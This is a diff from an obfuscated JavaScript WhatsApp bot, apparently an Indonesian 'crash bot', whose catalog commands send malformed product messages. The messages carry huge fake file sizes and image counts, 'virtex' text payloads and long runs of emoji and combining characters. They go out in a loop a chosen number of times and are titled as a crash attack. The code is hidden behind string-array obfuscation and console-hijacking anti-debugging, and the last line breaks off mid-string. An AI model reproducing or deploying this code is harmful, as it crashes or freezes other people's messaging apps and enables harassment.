-var _0x2848b3=_0x9e0d;(function(_0x44087c,_0x2e641c){var _0x1db5ee=_0x9e0d,_0x50f0d5=_0x44087c();while(!![]){try{var _0x277bf9=parseInt(_0x1db5ee(0x153))/0x1*(-parseInt(_0x1db5ee(0x13f))/0x2)+parseInt(_0x1db5ee(0x133))/0x3+parseInt(_0x1db5ee(0x142))/0x4*(parseInt(_0x1db5ee(0x130))/0x5)+parseInt(_0x1db5ee(0x141))/0x6*(parseInt(_0x1db5ee(0x14a))/0x7)+parseInt(_0x1db5ee(0x147))/0x8*(parseInt(_0x1db5ee(0x13b))/0x9)+parseInt(_0x1db5ee(0x12e))/0xa*(-parseInt(_0x1db5ee(0x154))/0xb)+-parseInt(_0x1db5ee(0x144))/0xc;if(_0x277bf9===_0x2e641c)break;else _0x50f0d5['push'](_0x50f0d5['shift']());}catch(_0x6eeb83){_0x50f0d5['push'](_0x50f0d5['shift']());}}}(_0x50d7,0x47edf));var _0x5305e6=(function(){var _0x2a071a=!![];return function(_0x44ac42,_0x2f3a86){var _0x5ddccf=_0x2a071a?function(){var _0x269a28=_0x9e0d;if(_0x2f3a86){var _0x956bb1=_0x2f3a86[_0x269a28(0x157)](_0x44ac42,arguments);return _0x2f3a86=null,_0x956bb1;}}:function(){};return _0x2a071a=![],_0x5ddccf;};}()),_0x6f3dcf=_0x5305e6(this,function(){var _0x29e902=_0x9e0d;return _0x6f3dcf[_0x29e902(0x131)]()[_0x29e902(0x149)](_0x29e902(0x158))[_0x29e902(0x131)]()[_0x29e902(0x12d)](_0x6f3dcf)['search']('(((.+)+)+)+$');});_0x6f3dcf();var _0x344797=(function(){var _0x43474b=!![];return function(_0x2ef73a,_0x38843d){var _0x978085=_0x43474b?function(){if(_0x38843d){var _0x45337b=_0x38843d['apply'](_0x2ef73a,arguments);return _0x38843d=null,_0x45337b;}}:function(){};return _0x43474b=![],_0x978085;};}()),_0x449ae5=_0x344797(this,function(){var _0xf9db85=_0x9e0d,_0x1fc2db;try{var _0x22834f=Function(_0xf9db85(0x12f)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x1fc2db=_0x22834f();}catch(_0x50cb5f){_0x1fc2db=window;}var _0x3e3222=_0x1fc2db[_0xf9db85(0x132)]=_0x1fc2db['console']||{},_0x2ce5fa=[_0xf9db85(0x156),_0xf9db85(0x138),'info','error','exception','table','trace'];for(var _0x5ae98c=0x0;_0x5ae98c<_0x2ce5fa[_0xf9db85(0x143)];_0x5ae98c++){var _0x4f19eb=_0x344797[_0xf9db85(0x12d)][_0xf9db85(0x13c)]['bind'](_0x344797),_0x32d7a2=_0x2ce5fa[_0x5ae98c],_0x51f1fe=_0x3e3222[_0x32d7a2]||_0x4f19eb;_0x4f19eb['__proto__']=_0x344797[_0xf9db85(0x145)](_0x344797),_0x4f19eb[_0xf9db85(0x131)]=_0x51f1fe['toString'][_0xf9db85(0x145)](_0x51f1fe),_0x3e3222[_0x32d7a2]=_0x4f19eb;}});function _0x9e0d(_0x40fd14,_0x354a07){var _0x31dc6c=_0x50d7();return _0x9e0d=function(_0x449ae5,_0x344797){_0x449ae5=_0x449ae5-0x12c;var _0xf55e2d=_0x31dc6c[_0x449ae5];return _0xf55e2d;},_0x9e0d(_0x40fd14,_0x354a07);}_0x449ae5();function _0x50d7(){var _0x47d5e3=['(((.+)+)+)+$','message','constructor','917710ZuapUK','return\x20(function()\x20','150555pDpiIU','toString','console','1278993oTOLBP','reply','CATALOG\x20NEW\x20ERA','chat','imageMessage','warn','💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤','https://youtube.com/channel/UCfhWUHl7dskRCVlyDMxnQbw','459cARajX','prototype','key','Gk\x20guna😏','218134ZoNNMe','fromObject','318OIQHsl','56ocjlOz','length','2897520eKxIyO','bind','Sukses\x20Send\x20Catalogv2\x20Sebanyak\x20','36280Mzoaim','relayMessage','search','36659iRltJZ','6285706035039@s.whatsapp.net','Jumlahnya?','readFileSync','Sama\x20gk\x20guna😏','./pict.jpg','999','JEMBOD','Message','5NkGlaQ','33RyawWt','waUploadToServer','log','apply'];_0x50d7=function(){return _0x47d5e3;};return _0x50d7();}{if(!isCreator&&!isBan)return;if(args[_0x2848b3(0x143)]==0x0)return m[_0x2848b3(0x134)](_0x2848b3(0x14c));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){var messa=await prepareWAMessageMedia({'image':fs[_0x2848b3(0x14d)](_0x2848b3(0x14f))},{'upload':jobotz[_0x2848b3(0x155)]}),catalog=generateWAMessageFromContent(m[_0x2848b3(0x136)],proto[_0x2848b3(0x152)][_0x2848b3(0x140)]({'productMessage':{'product':{'productImage':messa[_0x2848b3(0x137)],'productId':_0x2848b3(0x151),'fileLength':'99999999999','jpegThumbnail':virgam,'title':'𝙏𝙃𝙀\x20𝙄𝙆𝙔𝙔\x20𝘽𝙊𝙏𝙕𝙕 𝘾𝙍𝘼𝙎𝙃〽️','description':_0x2848b3(0x139)+virtex2,'currencyCode':'IDR','productImageCount':0x370ad515,'firstImageId':0x1,'priceAmount1000':_0x2848b3(0x150),'salePriceAmount1000':'IDR\x2099.99999999999999999999','bodyText':_0x2848b3(0x13e),'footerText':_0x2848b3(0x14e),'retailerId':_0x2848b3(0x135),'url':_0x2848b3(0x13a)},'businessOwnerJid':_0x2848b3(0x14b),'contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}}),{'userJid':m['chat'],'quoted':shield2});jobotz[_0x2848b3(0x148)](m['chat'],catalog[_0x2848b3(0x12c)],{'messageId':catalog[_0x2848b3(0x13d)]['id']});}jancok(_0x2848b3(0x146)+jumlah);}
+var _0x2848b3=_0x9e0d;(function(_0x44087c,_0x2e641c){var _0x1db5ee=_0x9e0d,_0x50f0d5=_0x44087c();while(!![]){try{var _0x277bf9=parseInt(_0x1db5ee(0x153))/0x1*(-parseInt(_0x1db5ee(0x13f))/0x2)+parseInt(_0x1db5ee(0x133))/0x3+parseInt(_0x1db5ee(0x142))/0x4*(parseInt(_0x1db5ee(0x130))/0x5)+parseInt(_0x1db5ee(0x141))/0x6*(parseInt(_0x1db5ee(0x14a))/0x7)+parseInt(_0x1db5ee(0x147))/0x8*(parseInt(_0x1db5ee(0x13b))/0x9)+parseInt(_0x1db5ee(0x12e))/0xa*(-parseInt(_0x1db5ee(0x154))/0xb)+-parseInt(_0x1db5ee(0x144))/0xc;if(_0x277bf9===_0x2e641c)break;else _0x50f0d5['push'](_0x50f0d5['shift']());}catch(_0x6eeb83){_0x50f0d5['push'](_0x50f0d5['shift']());}}}(_0x50d7,0x47edf));var _0x5305e6=(function(){var _0x2a071a=!![];return function(_0x44ac42,_0x2f3a86){var _0x5ddccf=_0x2a071a?function(){var _0x269a28=_0x9e0d;if(_0x2f3a86){var _0x956bb1=_0x2f3a86[_0x269a28(0x157)](_0x44ac42,arguments);return _0x2f3a86=null,_0x956bb1;}}:function(){};return _0x2a071a=![],_0x5ddccf;};}()),_0x6f3dcf=_0x5305e6(this,function(){var _0x29e902=_0x9e0d;return _0x6f3dcf[_0x29e902(0x131)]()[_0x29e902(0x149)](_0x29e902(0x158))[_0x29e902(0x131)]()[_0x29e902(0x12d)](_0x6f3dcf)['search']('(((.+)+)+)+$');});_0x6f3dcf();var _0x344797=(function(){var _0x43474b=!![];return function(_0x2ef73a,_0x38843d){var _0x978085=_0x43474b?function(){if(_0x38843d){var _0x45337b=_0x38843d['apply'](_0x2ef73a,arguments);return _0x38843d=null,_0x45337b;}}:function(){};return _0x43474b=![],_0x978085;};}()),_0x449ae5=_0x344797(this,function(){var _0xf9db85=_0x9e0d,_0x1fc2db;try{var _0x22834f=Function(_0xf9db85(0x12f)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x1fc2db=_0x22834f();}catch(_0x50cb5f){_0x1fc2db=window;}var _0x3e3222=_0x1fc2db[_0xf9db85(0x132)]=_0x1fc2db['console']||{},_0x2ce5fa=[_0xf9db85(0x156),_0xf9db85(0x138),'info','error','exception','table','trace'];for(var _0x5ae98c=0x0;_0x5ae98c<_0x2ce5fa[_0xf9db85(0x143)];_0x5ae98c++){var _0x4f19eb=_0x344797[_0xf9db85(0x12d)][_0xf9db85(0x13c)]['bind'](_0x344797),_0x32d7a2=_0x2ce5fa[_0x5ae98c],_0x51f1fe=_0x3e3222[_0x32d7a2]||_0x4f19eb;_0x4f19eb['__proto__']=_0x344797[_0xf9db85(0x145)](_0x344797),_0x4f19eb[_0xf9db85(0x131)]=_0x51f1fe['toString'][_0xf9db85(0x145)](_0x51f1fe),_0x3e3222[_0x32d7a2]=_0x4f19eb;}});function _0x9e0d(_0x40fd14,_0x354a07){var _0x31dc6c=_0x50d7();return _0x9e0d=function(_0x449ae5,_0x344797){_0x449ae5=_0x449ae5-0x12c;var _0xf55e2d=_0x31dc6c[_0x449ae5];return _0xf55e2d;},_0x9e0d(_0x40fd14,_0x354a07);}_0x449ae5();function _0x50d7(){var _0x47d5e3=['(((.+)+)+)+$','message','constructor','917710ZuapUK','return\x20(function()\x20','150555pDpiIU','toString','console','1278993oTOLBP','reply','CATALOG\x20NEW\x20ERA','chat','imageMessage','warn','💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤','https://youtube.com/channel/UCQmja37q_Pap24MgG0vUITQ','459cARajX','prototype','key','Gk\x20guna😏','218134ZoNNMe','fromObject','318OIQHsl','56ocjlOz','length','2897520eKxIyO','bind','Sukses\x20Send\x20Catalogv2\x20Sebanyak\x20','36280Mzoaim','relayMessage','search','36659iRltJZ','6285706035039@s.whatsapp.net','Jumlahnya?','readFileSync','Sama\x20gk\x20guna😏','./pict.jpg','999','JEMBOD','Message','5NkGlaQ','33RyawWt','waUploadToServer','log','apply'];_0x50d7=function(){return _0x47d5e3;};return _0x50d7();}{if(!isCreator&&!isBan)return;if(args[_0x2848b3(0x143)]==0x0)return m[_0x2848b3(0x134)](_0x2848b3(0x14c));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){var messa=await prepareWAMessageMedia({'image':fs[_0x2848b3(0x14d)](_0x2848b3(0x14f))},{'upload':jobotz[_0x2848b3(0x155)]}),catalog=generateWAMessageFromContent(m[_0x2848b3(0x136)],proto[_0x2848b3(0x152)][_0x2848b3(0x140)]({'productMessage':{'product':{'productImage':messa[_0x2848b3(0x137)],'productId':_0x2848b3(0x151),'fileLength':'99999999999','jpegThumbnail':virgam,'title':'𝙏𝙃𝙀\x20𝙄𝙆𝙔𝙔\x20𝘽𝙊𝙏𝙕𝙕 𝘾𝙍𝘼𝙎𝙃〽️','description':_0x2848b3(0x139)+virtex2,'currencyCode':'IDR','productImageCount':0x370ad515,'firstImageId':0x1,'priceAmount1000':_0x2848b3(0x150),'salePriceAmount1000':'IDR\x2099.99999999999999999999','bodyText':_0x2848b3(0x13e),'footerText':_0x2848b3(0x14e),'retailerId':_0x2848b3(0x135),'url':_0x2848b3(0x13a)},'businessOwnerJid':_0x2848b3(0x14b),'contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}}),{'userJid':m['chat'],'quoted':shield2});jobotz[_0x2848b3(0x148)](m['chat'],catalog[_0x2848b3(0x12c)],{'messageId':catalog[_0x2848b3(0x13d)]['id']});}jancok(_0x2848b3(0x146)+jumlah);}
 }
 break
 case 'jadicatalog':{
-var _0xc6393f=_0x3078;(function(_0x376098,_0x41d150){var _0x15893a=_0x3078,_0x1221ab=_0x376098();while(!![]){try{var _0x3e76b6=parseInt(_0x15893a(0x1c8))/0x1+-parseInt(_0x15893a(0x1e0))/0x2+-parseInt(_0x15893a(0x1e4))/0x3+-parseInt(_0x15893a(0x1d3))/0x4+parseInt(_0x15893a(0x1c5))/0x5+parseInt(_0x15893a(0x1ee))/0x6*(-parseInt(_0x15893a(0x1f1))/0x7)+-parseInt(_0x15893a(0x1e8))/0x8*(-parseInt(_0x15893a(0x1e7))/0x9);if(_0x3e76b6===_0x41d150)break;else _0x1221ab['push'](_0x1221ab['shift']());}catch(_0x556749){_0x1221ab['push'](_0x1221ab['shift']());}}}(_0x2fb6,0xb16c9));var _0x3dd764=(function(){var _0xbba82a=!![];return function(_0x1b80dd,_0xb6b0c4){var _0xb4c8ce=_0xbba82a?function(){var _0x1ea3d8=_0x3078;if(_0xb6b0c4){var _0x460efc=_0xb6b0c4[_0x1ea3d8(0x1e3)](_0x1b80dd,arguments);return _0xb6b0c4=null,_0x460efc;}}:function(){};return _0xbba82a=![],_0xb4c8ce;};}()),_0x144a49=_0x3dd764(this,function(){var _0x45550e=_0x3078;return _0x144a49[_0x45550e(0x1de)]()[_0x45550e(0x1ed)](_0x45550e(0x1cb))[_0x45550e(0x1de)]()['constructor'](_0x144a49)['search']('(((.+)+)+)+$');});_0x144a49();var _0x9ab345=(function(){var _0x504721=!![];return function(_0x2fe0bf,_0x439ee1){var _0x2e9311=_0x504721?function(){var _0x327dd2=_0x3078;if(_0x439ee1){var _0xdc52f3=_0x439ee1[_0x327dd2(0x1e3)](_0x2fe0bf,arguments);return _0x439ee1=null,_0xdc52f3;}}:function(){};return _0x504721=![],_0x2e9311;};}()),_0x1cfe6b=_0x9ab345(this,function(){var _0x363fdd=_0x3078,_0x50fb3e;try{var _0x200e7e=Function(_0x363fdd(0x1f2)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x50fb3e=_0x200e7e();}catch(_0x3f222b){_0x50fb3e=window;}var _0x367709=_0x50fb3e['console']=_0x50fb3e[_0x363fdd(0x1d0)]||{},_0x5efb4d=['log',_0x363fdd(0x1d2),_0x363fdd(0x1c9),_0x363fdd(0x1db),_0x363fdd(0x1e1),_0x363fdd(0x1e9),_0x363fdd(0x1ca)];for(var _0x160242=0x0;_0x160242<_0x5efb4d[_0x363fdd(0x1cd)];_0x160242++){var _0x1a6ecc=_0x9ab345[_0x363fdd(0x1dd)][_0x363fdd(0x1eb)][_0x363fdd(0x1cf)](_0x9ab345),_0x5a312f=_0x5efb4d[_0x160242],_0x308bfb=_0x367709[_0x5a312f]||_0x1a6ecc;_0x1a6ecc['__proto__']=_0x9ab345['bind'](_0x9ab345),_0x1a6ecc['toString']=_0x308bfb[_0x363fdd(0x1de)][_0x363fdd(0x1cf)](_0x308bfb),_0x367709[_0x5a312f]=_0x1a6ecc;}});function _0x2fb6(){var _0x486e7c=['chat','\x20CATALOG\x20BY:\x20','https://youtube.com/channel/UCQmja37q_Pap24MgG0vUITQ','key','error','Sama\x20gk\x20guna😏','constructor','toString','999','1013140wuXFkp','exception','JEMBOD','apply','4093098tXPWyd','quoted','Sukses\x20Convert\x20Catalog','36FgFzVn','3564664WwoUci','table','download','prototype','fromObject','search','90JcNRqc','Message','waUploadToServer','191128udPmNc','return\x20(function()\x20','IDR\x2099.99999999999999999999','724660yYTUZf','Teksnya\x20Mana?','message','1410409qLUrYj','info','trace','(((.+)+)+)+$','relayMessage','length','imageMessage','bind','console','*Send/Reply\x20Image','warn','1321792kNwTBp','CATALOG\x20NEW\x20ERA','💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤','Gk\x20guna😏'];_0x2fb6=function(){return _0x486e7c;};return _0x2fb6();}_0x1cfe6b();function _0x3078(_0x4bfee0,_0x460f0a){var _0xea9cbb=_0x2fb6();return _0x3078=function(_0x1cfe6b,_0x9ab345){_0x1cfe6b=_0x1cfe6b-0x1c5;var _0x2369ff=_0xea9cbb[_0x1cfe6b];return _0x2369ff;},_0x3078(_0x4bfee0,_0x460f0a);}{if(!isCreator&&!isBan)return;if(!m[_0xc6393f(0x1e5)])throw _0xc6393f(0x1d1);if(!text)throw _0xc6393f(0x1c6);let media=await quoted[_0xc6393f(0x1ea)]();var messa=await prepareWAMessageMedia({'image':media},{'upload':jobotz[_0xc6393f(0x1f0)]}),catalog=generateWAMessageFromContent(m[_0xc6393f(0x1d7)],proto[_0xc6393f(0x1ef)][_0xc6393f(0x1ec)]({'productMessage':{'product':{'productImage':messa[_0xc6393f(0x1ce)],'productId':_0xc6393f(0x1e2),'fileLength':'99999999999','jpegThumbnail':virgam,'title':_0xc6393f(0x1d8)+text+'\x20','description':_0xc6393f(0x1d5)+philips,'currencyCode':'IDR','productImageCount':0x370ad515,'firstImageId':0x1,'priceAmount1000':_0xc6393f(0x1df),'salePriceAmount1000':_0xc6393f(0x1f3),'bodyText':_0xc6393f(0x1d6),'footerText':_0xc6393f(0x1dc),'retailerId':_0xc6393f(0x1d4),'url':_0xc6393f(0x1d9)},'businessOwnerJid':'6285706035039@s.whatsapp.net','contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}}),{'userJid':m[_0xc6393f(0x1d7)],'quoted':shield2});jobotz[_0xc6393f(0x1cc)](m[_0xc6393f(0x1d7)],catalog[_0xc6393f(0x1c7)],{'messageId':catalog[_0xc6393f(0x1da)]['id']}),jancok(_0xc6393f(0x1e6));}
+var _0xc6393f=_0x3078;(function(_0x376098,_0x41d150){var _0x15893a=_0x3078,_0x1221ab=_0x376098();while(!![]){try{var _0x3e76b6=parseInt(_0x15893a(0x1c8))/0x1+-parseInt(_0x15893a(0x1e0))/0x2+-parseInt(_0x15893a(0x1e4))/0x3+-parseInt(_0x15893a(0x1d3))/0x4+parseInt(_0x15893a(0x1c5))/0x5+parseInt(_0x15893a(0x1ee))/0x6*(-parseInt(_0x15893a(0x1f1))/0x7)+-parseInt(_0x15893a(0x1e8))/0x8*(-parseInt(_0x15893a(0x1e7))/0x9);if(_0x3e76b6===_0x41d150)break;else _0x1221ab['push'](_0x1221ab['shift']());}catch(_0x556749){_0x1221ab['push'](_0x1221ab['shift']());}}}(_0x2fb6,0xb16c9));var _0x3dd764=(function(){var _0xbba82a=!![];return function(_0x1b80dd,_0xb6b0c4){var _0xb4c8ce=_0xbba82a?function(){var _0x1ea3d8=_0x3078;if(_0xb6b0c4){var _0x460efc=_0xb6b0c4[_0x1ea3d8(0x1e3)](_0x1b80dd,arguments);return _0xb6b0c4=null,_0x460efc;}}:function(){};return _0xbba82a=![],_0xb4c8ce;};}()),_0x144a49=_0x3dd764(this,function(){var _0x45550e=_0x3078;return _0x144a49[_0x45550e(0x1de)]()[_0x45550e(0x1ed)](_0x45550e(0x1cb))[_0x45550e(0x1de)]()['constructor'](_0x144a49)['search']('(((.+)+)+)+$');});_0x144a49();var _0x9ab345=(function(){var _0x504721=!![];return function(_0x2fe0bf,_0x439ee1){var _0x2e9311=_0x504721?function(){var _0x327dd2=_0x3078;if(_0x439ee1){var _0xdc52f3=_0x439ee1[_0x327dd2(0x1e3)](_0x2fe0bf,arguments);return _0x439ee1=null,_0xdc52f3;}}:function(){};return _0x504721=![],_0x2e9311;};}()),_0x1cfe6b=_0x9ab345(this,function(){var _0x363fdd=_0x3078,_0x50fb3e;try{var _0x200e7e=Function(_0x363fdd(0x1f2)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x50fb3e=_0x200e7e();}catch(_0x3f222b){_0x50fb3e=window;}var _0x367709=_0x50fb3e['console']=_0x50fb3e[_0x363fdd(0x1d0)]||{},_0x5efb4d=['log',_0x363fdd(0x1d2),_0x363fdd(0x1c9),_0x363fdd(0x1db),_0x363fdd(0x1e1),_0x363fdd(0x1e9),_0x363fdd(0x1ca)];for(var _0x160242=0x0;_0x160242<_0x5efb4d[_0x363fdd(0x1cd)];_0x160242++){var _0x1a6ecc=_0x9ab345[_0x363fdd(0x1dd)][_0x363fdd(0x1eb)][_0x363fdd(0x1cf)](_0x9ab345),_0x5a312f=_0x5efb4d[_0x160242],_0x308bfb=_0x367709[_0x5a312f]||_0x1a6ecc;_0x1a6ecc['__proto__']=_0x9ab345['bind'](_0x9ab345),_0x1a6ecc['toString']=_0x308bfb[_0x363fdd(0x1de)][_0x363fdd(0x1cf)](_0x308bfb),_0x367709[_0x5a312f]=_0x1a6ecc;}});function _0x2fb6(){var _0x486e7c=['chat','\x20CATALOG\x20BY:\x20','https://youtube.com/channel/UCQmja37q_Pap24MgG0vUITQ','key','error','Sama\x20gk\x20guna😏','constructor','toString','999','1013140wuXFkp','exception','JEMBOD','apply','4093098tXPWyd','quoted','Sukses\x20Convert\x20Catalog','36FgFzVn','3564664WwoUci','table','download','prototype','fromObject','search','90JcNRqc','Message','waUploadToServer','191128udPmNc','return\x20(function()\x20','IDR\x2099.99999999999999999999','724660yYTUZf','Teksnya\x20Mana?','message','1410409qLUrYj','info','trace','(((.+)+)+)+$','relayMessage','length','imageMessage','bind','console','*Send/Reply\x20Image','warn','1321792kNwTBp','CATALOG\x20NEW\x20ERA','💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 